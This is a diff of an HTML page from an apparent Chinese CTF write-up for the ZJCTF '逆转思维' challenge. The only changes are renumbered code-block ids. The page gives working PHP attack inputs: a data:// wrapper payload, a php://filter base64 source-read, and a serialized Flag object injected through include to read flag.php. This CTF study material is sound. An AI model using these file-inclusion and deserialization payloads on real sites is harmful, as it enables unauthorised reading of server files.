@@ -3536,14 +3536,14 @@
 <p><img alt="index.php 源码" src="../../../assets/images/zjctf/01-index.png" /></p>
 <h3 id="text"><a class="toclink" href="../../zjctf-nizhuansiwei/#text">一、text</a></h3>
 <p>因为 <code>file_get_contents</code> 读的是文件，所以用 <code>data</code> 协议，构造 payload：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>?text=data://text/plain,welcome to the zjctf
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>?text=data://text/plain,welcome to the zjctf
 </span></code></pre></div>
 <p>成功。</p>
 <p><img alt="welcome to the zjctf" src="../../../assets/images/zjctf/02-welcome.png" /></p>
 <h3 id="file"><a class="toclink" href="../../zjctf-nizhuansiwei/#file">二、file</a></h3>
 <p>不能包含 <code>flag.php</code>，这个很可能就是 flag。他注释在旁边有一个 <code>useless.php</code>，先读一下文件。</p>
 <p>但是 <code>include</code> 会将其中的 PHP 代码直接执行而不会打印出来（里面没 echo 的情况下，一般都没有），所以这里利用 PHP 伪协议直接将其转换为 base64 的数据，就不会被执行了：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>php://filter/read=convert.base64-encode/resource=useless.php
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>php://filter/read=convert.base64-encode/resource=useless.php
 </span></code></pre></div>
 <p>对其进行解码后，接着审计代码。</p>
 <p><img alt="useless.php 源码" src="../../../assets/images/zjctf/03-useless.png" /></p>
@@ -3553,7 +3553,7 @@
 <p>依据那个类的形式进行序列化后，就可以得到 <code>password</code> 的值了。</p>
 <p><img alt="本地生成序列化" src="../../../assets/images/zjctf/04-serialize.png" /></p>
 <h3 id="payload"><a class="toclink" href="../../zjctf-nizhuansiwei/#payload">四、最终 payload</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
 </span></code></pre></div>
 <p><img alt="拿到 flag" src="../../../assets/images/zjctf/05-flag.png" /></p>
 <h3 id="_1"><a class="toclink" href="../../zjctf-nizhuansiwei/#_1">踩的坑</a></h3>
